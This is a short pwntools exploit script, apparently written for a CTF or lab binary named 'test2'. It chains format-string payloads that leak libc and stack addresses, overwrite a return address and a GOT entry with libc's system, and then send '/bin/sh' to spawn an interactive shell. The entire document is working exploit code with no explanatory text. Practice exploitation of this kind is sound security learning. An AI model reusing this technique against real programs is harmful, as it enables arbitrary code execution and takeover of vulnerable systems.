from pwn import *
p = process("./test2")
gdb.attach("test2")
# leak libc base: parameter 2, write to ret: parameter 4
#call_vuln = [0x0804,0x921d]
func_off = 1934784
sys_off = 250592
exp = "%2$p.%4$p"
exp += "%" + str(0x921d-21) + "c%4$hn"
p.sendline(exp)
leak = p.recv(21+44)
leak = leak.split('.')
print leak
libc_func = int(leak[0],16)
stack_base = int(leak[1],16)
libc_base = libc_func - func_off

print "stack base: ", hex(stack_base)
print "libc base: ", hex(libc_base)
para13_addr = stack_base+4
para13_aL = para13_addr&0x0000ffff
if para13_aL-0x921d>0:
	exp = "%"+str(0x921d)+"c%4$hn"
	exp+= "%"+str(para13_aL-0x921d)+"c%22$hn"
else:
	exp= "%"+str(para13_aL)+"c%22$hn"
	exp += "%"+str(0x921d-para13_aL)+"c%4$hn"
exp+= "%2c%23$hn"
p.sendline(exp)
#0x804c00c
exp = "%"+str(0x0804)+"c%60$hn"
exp+= "%"+str(0x921d-0x0804)+"c%4$hn"
exp+= "%"+str(0xc00c-0x921d)+"c%58$hn"
sys_addr = sys_off + libc_base
sys_aL = sys_addr&0x0000ffff
p.sendline(exp)
if sys_aL-0x921d>0:
	exp = "%"+str(0x921d)+"c%4$hn"
	exp+= "%"+str(sys_aL-0x921d)+"c%13$hn"
else:
	exp= "%"+str(sys_aL)+"c%13$hn"
	exp += "%"+str(0x921d-sys_aL+0x10000)+"c%4$hn"
p.sendline(exp)
exp = "/bin/sh"
p.sendline(exp)
p.interactive()
